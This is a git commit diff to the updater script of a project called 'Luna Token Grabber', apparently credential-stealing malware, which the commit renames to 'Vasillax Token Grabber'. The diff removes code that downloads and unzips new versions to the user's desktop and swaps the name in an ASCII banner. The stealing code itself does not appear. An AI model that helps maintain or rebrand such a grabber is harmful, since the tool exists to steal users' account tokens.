1f5c756c9d2a7ffd4a65dd38fd7dd30c6f2d8993
vasillax12 <135127605+vasillax12@users.noreply.github.com>
2023-06-03 18:34:47 +0300

    update.py

--- tools/update.py
+++ tools/update.py
@@ -27,23 +27,5 @@ class Update():
                     ██║╚██╗██║██╔══╝  ██║███╗██║    ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  ╚═╝
                     ██║ ╚████║███████╗╚███╔███╔╝    ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗██╗
                     ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝
-                                      Your version of Luna Token Grabber is outdated!''')
-            choice = input('\nWould you like to update? (y/n): ')
-            if choice.lower() == 'y':
-                new_version_source = requests.get(self.zipfile)
-                with open("Luna-Grabber-main.zip", 'wb')as zipfile:
-                    zipfile.write(new_version_source.content)
-                with ZipFile("Luna-Grabber-main.zip", 'r') as filezip:
-                    filezip.extractall(path=os.path.join(os.path.expanduser("~"), "Desktop"))
-                os.remove("Luna-Grabber-main.zip")
-                print('The new version is now on your desktop.\nUpdate Complete!')
-                print("Exiting...")
-                sleep(5)
-            if choice.lower() == 'n':
-                print('Exiting...')
-                sleep(2)
-                exit()
-
-
-if __name__ == '__main__':
-    Update()
+                                      Your version of Vasillax Token Grabber is outdated!''')
+          
